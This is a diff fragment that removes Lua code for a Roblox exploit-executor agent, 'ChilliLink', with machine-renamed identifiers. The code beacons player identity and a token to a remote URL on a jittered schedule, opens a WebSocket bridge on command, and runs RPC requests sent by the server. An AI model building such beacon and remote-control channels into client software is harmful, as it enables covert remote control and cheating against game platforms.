-			fn19("Connected to bridge. Client ID:", tostring(result.clientId))
-			local tbl37 = {}
-
-			for k in pairs(tbl36) do
-				table.insert(tbl37, k)
-			end
-
-			table.sort(tbl37)
-			fn30("agent.ready", { clientId = result.clientId, methods = tbl37, playerCount = #Players2:GetPlayers() })
-			return
-		end
-
-		if result.type == "pong" then
-			fn19("PONG", tostring(result.seq or ""))
-			return
-		end
-
-		if result.type == "rpc_request" then
-			fn55(result)
-			return
-		end
-
-		if result.type == "identify_error" then
-			fn20("Bridge rejected identity:", tostring(result.error))
-		end
-	end
-
-	local function fn57()
-		flag7 = false
-		fn23(tbl23)
-		if not v15 then
-			return
-		end
-
-		pcall(function()
-			if type(v15.Close) == "function" then
-				v15:Close()
-			elseif type(v15.close) == "function" then
-				v15:close()
-			end
-		end)
-
-		v15 = nil
-	end
-
-	local function fn58()
-		local v16, v17 = fn24()
-		if not v16 then
-			fn20("No supported WebSocket API found")
-			return false
-		end
-		n14 += 1
-		local v18 = n14
-		fn19("Connecting to", str2, "using", v17)
-
-		local ok, result = pcall(function()
-			return v16(str2)
-		end)
-
-		if not ok or not result then
-			fn20("Connection failed:", tostring(result))
-			return false
-		end
-		v15 = result
-		flag7 = true
-		local onMessage = fn25(v15, "OnMessage", "MessageReceived")
-		local onClose = fn25(v15, "OnClose", "Closed", "OnDisconnect")
-		local onError = fn25(v15, "OnError", "Error")
-
-		local v19 = fn26(onMessage, function(arg)
-			if v18 == n14 then
-				fn56(arg)
-			end
-		end)
-
-		if v19 then
-			table.insert(tbl23, v19)
-
-			local v20 = fn26(onClose, function(...)
-				if v18 == n14 then
-					flag7 = false
-					fn20("Socket closed", ...)
-				end
-			end)
-
-			if v20 then
-				table.insert(tbl23, v20)
-			end
-
-			local v21 = fn26(onError, function(...)
-				if v18 == n14 then
-					fn20("Socket error", ...)
-					flag7 = false
-				end
-			end)
-
-			if v21 then
-				table.insert(tbl23, v21)
-			end
-
-			local v22, v23 = fn29({
-				type = "identify",
-				clientType = "roblox",
-				token = str,
-				name = localPlayer2.Name,
-				displayName = localPlayer2.DisplayName,
-				userId = localPlayer2.UserId,
-				placeId = game.PlaceId,
-				jobId = game.JobId,
-				version = str4,
-			})
-
-			if not v22 then
-				fn20(v23)
-				flag7 = false
-			end
-
-			task.spawn(function()
-				while flag6 and flag7 and v18 == n14 do
-					task.wait(20)
-
-					if flag6 and flag7 and v18 == n14 then
-						n15 += 1
-						local v24, v25 = fn29({ type = "ping", seq = n15 })
-
-						if not v24 then
-							fn20("Heartbeat failed:", tostring(v25))
-							flag7 = false
-						end
-					end
-				end
-			end)
-
-			while flag6 and flag7 and v18 == n14 do
-				task.wait(0.5)
-			end
-
-			if v18 == n14 then
-				fn57()
-			end
-
-			return true
-		end
-
-		fn20("Socket has no supported message event")
-		fn57()
-		return false
-	end
-
-	table.insert(tbl22, Players2.PlayerAdded:Connect(function(player)
-		if flag5 then
-			fn30("player.added", fn54(player, true))
-		end
-	end))
-
-	table.insert(tbl22, Players2.PlayerRemoving:Connect(function(player)
-		if flag5 then
-			fn30("player.removing", fn54(player, true))
-		end
-	end))
-
-	genv.StopChilliLink = function()
-		if not flag6 then
-			return
-		end
-		fn19("Stopping agent")
-		flag6 = false
-		n14 += 1
-		fn23(tbl22)
-		fn23(tbl24)
-		fn57()
-	end
-
-	local request_2 = syn and syn.request or http_request or request or request_ and request_.request or fluxus and fluxus.request
-
-	local function fn59()
-		if type(request_2) ~= "function" then
-			return nil
-		end
-
-		local ok, result = pcall(function()
-			return HttpService2:JSONEncode({
-				token = str,
-				userId = localPlayer2.UserId,
-				name = localPlayer2.Name,
-				displayName = localPlayer2.DisplayName,
-				placeId = game.PlaceId,
-				jobId = game.JobId,
-				version = str4,
-			})
-		end)
-
-		if not ok then
-			return nil
-		end
-		local ok2, result2 = pcall(request_2, { Url = str3, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = result })
-		if not ok2 or type(result2) ~= "table" or tonumber(result2.StatusCode) ~= 200 then
-			return nil
-		end
-
-		local ok3, result3 = pcall(function()
-			return HttpService2:JSONDecode(tostring(result2.Body))
-		end)
-
-		if ok3 and type(result3) == "table" then
-			return result3
-		end
-		return nil
-	end
-
-	task.spawn(function()
-		while flag6 do
-			local v16 = fn59()
-			local n18 = 60
-
-			if v16 then
-				n18 = fn22(v16.interval, 5, 600, 60)
-
-				if v16.connect == true and not flag8 and not flag7 then
-					flag8 = true
-
-					task.spawn(function()
-						pcall(fn58)
-						flag8 = false
-					end)
-				end
-			end
-
-			task.wait(n18 * (0.85 + math.random() * 0.3))
-		end
-
-		fn19("Agent stopped")
-	end)
-end
